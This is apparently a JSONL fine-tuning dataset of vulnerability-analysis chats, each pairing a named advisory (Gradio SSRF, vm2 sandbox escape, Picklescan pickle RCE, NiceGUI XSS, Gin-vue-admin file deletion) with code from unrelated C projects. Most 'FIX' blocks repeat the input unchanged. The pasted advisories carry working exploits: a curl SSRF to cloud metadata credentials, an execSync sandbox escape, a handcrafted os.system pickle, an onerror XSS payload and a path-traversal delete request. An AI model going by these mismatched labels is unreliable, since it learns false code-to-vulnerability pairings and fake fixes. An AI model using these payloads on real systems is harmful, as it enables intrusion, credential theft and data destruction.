server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Gradio has SSRF via Malicious `proxy_url` Injection in `gr.load()` Config Processing:\n\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-918\nREASON: ### Summary\n\nA Server-Side Request Forgery (SSRF) vulnerability in Gradio allows an attacker to make arbitrary HTTP requests from a victim's server by hosting a malicious Gradio Space. When a victim application uses `gr.load()` to load an attacker-controlled Space, the malicious `proxy_url` from the config is trusted and added to the allowlist, enabling the attacker to access internal services, cloud metadata endpoints, and private networks through the victim's infrastructure.\n\n### Details\n\nThe vulnerability exists in Gradio's config processing flow when loading external Spaces:\n\n1. **Config Fetching** (`gradio/external.py:630`): `gr.load()` calls `Blocks.from_config()` which fetches and processes the remote Space's configuration.\n\n2. **Proxy URL Trust** (`gradio/blocks.py:1231-1233`): The `proxy_url` from the untrusted config is added directly to `self.proxy_urls`:\n   ```python\n   if config.get(\"proxy_url\"):\n       self.proxy_urls.add(config[\"proxy_url\"])\n   ```\n\n3. **Built-in Proxy Route** (`gradio/routes.py:1029-1031`): Every Gradio app automatically exposes a `/proxy={url_path}` endpoint:\n   ```python\n   @router.get(\"/proxy={url_path:path}\", dependencies=[Depends(login_check)])\n   async def reverse_proxy(url_path: str):\n   ```\n\n4. **Host-based Validation** (`gradio/routes.py:365-368`): The validation only checks if the URL's host matches any trusted `proxy_url` host:\n   ```python\n   is_safe_url = any(\n       url.host == httpx.URL(root).host for root in self.blocks.proxy_urls\n   )\n   ```\n\nAn attacker can set `proxy_url` to `http://169.254.169.254/` (AWS metadata) or any internal service, and the victim's server will proxy requests to those endpoints.\n\n### PoC\n\nFull PoC: https://gist.github.com/logicx24/8d4c1aaa4e70f85d0d0fba06a463f2d6\n\n**1. Attacker creates a malicious Gradio Space** that returns this config:\n```python\n{\n    \"mode\": \"blocks\",\n    \"components\": [...],\n    \"proxy_url\": \"http://169.254.169.254/\"  # AWS metadata endpoint\n}\n```\n\n**2. Victim loads the malicious Space:**\n```python\nimport gradio as gr\ndemo = gr.load(\"attacker/malicious-space\")\ndemo.launch(server_name=\"0.0.0.0\", server_port=7860)\n```\n\n**3. Attacker exploits the proxy:**\n```bash\n# Fetch AWS credentials through victim's server\ncurl \"http://victim:7860/gradio_api/proxy=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\"\n```\n\n### Impact\n\n**Who is impacted:**\n- Any Gradio application that uses `gr.load()` to load external/untrusted Spaces\n- HuggingFace Spaces that compose or embed other Spaces\n- Enterprise deployments where Gradio apps have access to internal networks\n\n**Attack scenarios:**\n- **Cloud credential theft**: Access AWS/GCP/Azure metadata endpoints to steal IAM credentials\n- **Internal service access**: Reach databases, admin panels, and APIs on private networks\n- **Network reconnaissance**: Map internal infrastructure through the victim\n- **Data exfiltration**: Access sensitive internal APIs and services\nFIX:\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n\t// Is this a URL rather than a device?\n\t// If so, reject it.\n\tif (is_url(source))\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string refers to a remote device\");\n\t\tgoto error;\n\t}\n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for vm2 has a Sandbox Escape:\n\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-94\nREASON: In vm2 for version 3.10.0, `Promise.prototype.then` `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary code.\n\n```js\nconst { VM } = require(\"vm2\");\n\nconst code = `\nconst error = new Error();\nerror.name = Symbol();\nconst f = async () => error.stack;\nconst promise = f();\npromise.catch(e => {\n    const Error = e.constructor;\n    const Function = Error.constructor;\n    const f = new Function(\n        \"process.mainModule.require('child_process').execSync('echo HELLO WORLD!', { stdio: 'inherit' })\"\n    );\n    f();\n});\n`;\n\nnew VM().run(code);\n```\n\nIn lib/setup-sandbox.js, the callback function of `localPromise.prototype.then` is sanitized, but `globalPromise.prototype.then` is not sanitized. The return value of async functions is `globalPromise` object.\nFIX:\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Picklescan is vulnerable to RCE through missing detection when calling built-in python operator.methodcaller:\n\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-94\nREASON: ### Summary\nPicklescan uses `operator.methodcaller`, which is a built-in python library function to execute remote pickle files.\n\n### Details\nThe attack payload executes in the following steps:\n\n- First, the attacker crafts the payload by calling the `operator.methodcaller` function in method `reduce`.\n- Then, when the victim checks whether the pickle file is safe using the Picklescan library and this library doesn't detect any dangerous functions, they decide to use pickle.load() on this malicious pickle file, thus leading to remote code execution.\n\n### PoC\n```\nimport pickle\nimport pickletools\nopcode1 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0coperator\nmethodcaller\n(Vsystem\nVecho \"pwned by operator.methodcaller\"\ntR(g0\ntR.'''\npickletools.dis(opcode1)\npickle.loads(opcode1)\n```\nThis PoC can't be easily created by pickle.dumps, therefore it was manually built. \n\n### Impact\nAny organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nAttackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nAttackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Report by\nPinji Chen (cpj24@mails.tsinghua.edu.cn) from the NISL lab (https://netsec.ccert.edu.cn/about) at Tsinghua University, Guanheng Liu (coolwind326@gmail.com).\nFIX:\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for DotNetNuke.Core Vulnerable to Stored XSS via Module Title:\n\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: Module title supports richtext which could include scripts that would execute in certain scenarios.\nFIX:\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for ImageMagick has a possible infinite loop in its JPEG encoder when using `jpeg:extent`:\n\ne1000e_set_ims(E1000ECore *core, int index, uint32_t val)\n{\n    static const uint32_t ims_ext_mask =\n        E1000_IMS_RXQ0 | E1000_IMS_RXQ1 |\n        E1000_IMS_TXQ0 | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    static const uint32_t ims_valid_mask =\n        E1000_IMS_TXDW      | E1000_IMS_TXQE    | E1000_IMS_LSC  |\n        E1000_IMS_RXDMT0    | E1000_IMS_RXO     | E1000_IMS_RXT0 |\n        E1000_IMS_MDAC      | E1000_IMS_TXD_LOW | E1000_IMS_SRPD |\n        E1000_IMS_ACK       | E1000_IMS_MNG     | E1000_IMS_RXQ0 |\n        E1000_IMS_RXQ1      | E1000_IMS_TXQ0    | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    uint32_t valid_val = val & ims_valid_mask;\n\n    trace_e1000e_irq_set_ims(val, core->mac[IMS], core->mac[IMS] | valid_val);\n    core->mac[IMS] |= valid_val;\n\n    if ((valid_val & ims_ext_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_PBA_CLR) &&\n        msix_enabled(core->owner)) {\n        e1000e_msix_clear(core, valid_val);\n    }\n\n    if ((valid_val == ims_valid_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_INT_TIMERS_CLEAR_ENA)) {\n        trace_e1000e_irq_fire_all_timers(val);\n        e1000e_intrmgr_fire_all_timers(core);\n    }\n\n    e1000e_update_interrupt_state(core);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-835\nREASON: A `continue` statement in the JPEG extent binary search loop in the jpeg encoder causes an infinite loop when writing persistently fails. An attacker can trigger a 100% CPU consumption and process hang (Denial of Service) with a crafted image.\nFIX:\ne1000e_set_ims(E1000ECore *core, int index, uint32_t val)\n{\n    static const uint32_t ims_ext_mask =\n        E1000_IMS_RXQ0 | E1000_IMS_RXQ1 |\n        E1000_IMS_TXQ0 | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    static const uint32_t ims_valid_mask =\n        E1000_IMS_TXDW      | E1000_IMS_TXQE    | E1000_IMS_LSC  |\n        E1000_IMS_RXDMT0    | E1000_IMS_RXO     | E1000_IMS_RXT0 |\n        E1000_IMS_MDAC      | E1000_IMS_TXD_LOW | E1000_IMS_SRPD |\n        E1000_IMS_ACK       | E1000_IMS_MNG     | E1000_IMS_RXQ0 |\n        E1000_IMS_RXQ1      | E1000_IMS_TXQ0    | E1000_IMS_TXQ1 |\n        E1000_IMS_OTHER;\n\n    uint32_t valid_val = val & ims_valid_mask;\n\n    trace_e1000e_irq_set_ims(val, core->mac[IMS], core->mac[IMS] | valid_val);\n    core->mac[IMS] |= valid_val;\n\n    if ((valid_val & ims_ext_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_PBA_CLR) &&\n        msix_enabled(core->owner)) {\n        e1000e_msix_clear(core, valid_val);\n    }\n\n    if ((valid_val == ims_valid_mask) &&\n        (core->mac[CTRL_EXT] & E1000_CTRL_EXT_INT_TIMERS_CLEAR_ENA)) {\n        trace_e1000e_irq_fire_all_timers(val);\n        e1000e_intrmgr_fire_all_timers(core);\n    }\n\n    e1000e_update_interrupt_state(core);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for NiceGUI Stored/Reflected XSS in ui.interactive_image via unsanitized SVG content:\n\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Summary\nA Cross-Site Scripting (XSS) vulnerability exists in the `ui.interactive_image` component of NiceGUI (v3.3.1 and earlier). The component renders SVG content using Vue's `v-html` directive without any sanitization. This allows attackers to inject malicious HTML or JavaScript via the SVG `<foreignObject>` tag.\n\n### Details\nThe vulnerability is located in `nicegui/elements/interactive_image.js`.\nThe component uses the following code to render content:\n```javascript\n<g v-html=\"content\"></g>\n```\nVue's v-html directive renders raw HTML strings into the DOM. If an application allows user-controlled input to be passed to the content property of an interactive image, an attacker can embed a <foreignObject> tag containing malicious scripts, bypassing typical image restrictions.\n\n### PoC\n```python\nfrom nicegui import ui\n\n@ui.page('/')\ndef main():\n    ui.label('NiceGUI SVG XSS PoC')\n    \n    # Standard image loading\n    img = ui.interactive_image('[https://picsum.photos/640/360](https://picsum.photos/640/360)')\n    \n    # Payload: Embeds raw HTML execution inside SVG\n    # This executes immediately when the image component is rendered\n    img.content = (\n        '<foreignObject>'\n        '<body xmlns=\"[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml)\">'\n        '<img src=x onerror=alert(\"XSS-SVG\")>'\n        '</body>'\n        '</foreignObject>'\n    )\n\nui.run()\n```\n\n### Impact\n- Type: Reflected / Stored XSS (depending on data source)\n\n- Severity: Moderate\n\n- Impact: Attackers can inject malicious scripts that execute whenever the image component is rendered or updated. This is particularly dangerous for dashboards or multi-user applications displaying user-generated content or annotations.\nFIX:\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for OpenCloud Reva has a Public Link Exploit:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Impact\n\nA security issue was discovered in Reva based products that enables a malicious user to bypass the scope validation of a public link, allowing it to access resources outside the scope of a public link.\n\n### Details\n\nPublic link shares in OpenCloud are bound to a specific scope (usually a file or directory). Anonymous users accessing resources via this public link share are only allowed to access the share resource itself and, in case of a directory or space root, all child resources of it.\n\nDue to a bug in the GRPC authorization middleware of the \"Reva\" component of OpenCloud a malicious user is able to bypass the scope verification. By exploiting this via the the \"archiver\" service this can be leveraged to create an archive (zip or tar-file) containing all resources that this creator of the public link has access to.\n\nIt is not possible to bypass the public link scope via \"normal\" WebDAV requests so it is not possible to exploit this vulnerability via WebDAV.\n\n### Patches\n\nUpdate to OpenCloud Reva version >= 2.40.3 for the 2.40.x versions.\\\nUpdate to OpenCloud Reva version >= 2.42.3 for the 2.41.x versions\n\n### Workarounds\n\nThere is no workaround because one cannot run Reva standalone from this project. Please check the [OpenCloud Advisory](https://github.com/opencloud-eu/opencloud/security/advisories/GHSA-vf5j-r2hw-2hrw) how to mitigate the problem in an OpenCloud deployment via configuration.\n\n### For more information\n\nIf there are any questions or comments about this advisory:\n\n- Security Support: [security@opencloud.eu](mailto:security@opencloud.eu)\n- Technical Support: [support@opencloud.eu](mailto:support@opencloud.eu)\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Gin-vue-admin has an arbitrary file deletion vulnerability:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Impact\nAttackers can delete any file on the server at will, causing damage or unavailability of server resources. Attackers can control the 'FileMd5' parameter to delete any file and folder\n\n The affected code:\n![image (1)](https://github.com/user-attachments/assets/26eab823-2df8-454a-a42e-a512925d62b6)\n\nAffected interfaces:\n/api/fileUploadAndDownload/removeChunk\n\n\nPOC:\nYou can specify the FileMd5 value as the directory or file you want to delete\n\n```POST /api/fileUploadAndDownload/removeChunk HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Length: 78\nsec-ch-ua: \"Not=A?Brand\";v=\"99\", \"Chromium\";v=\"118\"\nx-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiOGYzYTdjMmMtYjAwMC00ODFmLWEyNGYtYzQyMDc2NTFjNWRmIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTc2MzIxNDQzMywibmJmIjoxNzYyNjA5NjMzfQ.7BTnRq65JDiPdlb0gJuAUa2nifIDTtePsnDnAtZoFJQ\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36\nContent-Type: application/json\nAccept: application/json, text/plain, */*\nx-user-id: 1\nsec-ch-ua-platform: \"Windows\"\nOrigin: http://127.0.0.1:8080\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:8080/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: x-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiOGYzYTdjMmMtYjAwMC00ODFmLWEyNGYtYzQyMDc2NTFjNWRmIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTc2MzIxNDQzMywibmJmIjoxNzYyNjA5NjMzfQ.7BTnRq65JDiPdlb0gJuAUa2nifIDTtePsnDnAtZoFJQ\nConnection: close\n\n{\"fileName\":\"ceshi.jpg\",\"fileMd5\":\"../config.yaml\",\"filePath\":\"./fileDir/ceshi.jpg\"}\n```\n![image (2)](https://github.com/user-attachments/assets/aafeb46b-933a-44b6-9fcf-da0f44269e5b)\n\n### Patches\nPlease wait for the latest patch\n\n### References\nhttps://github.com/flipped-aurora/gin-vue-admin\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
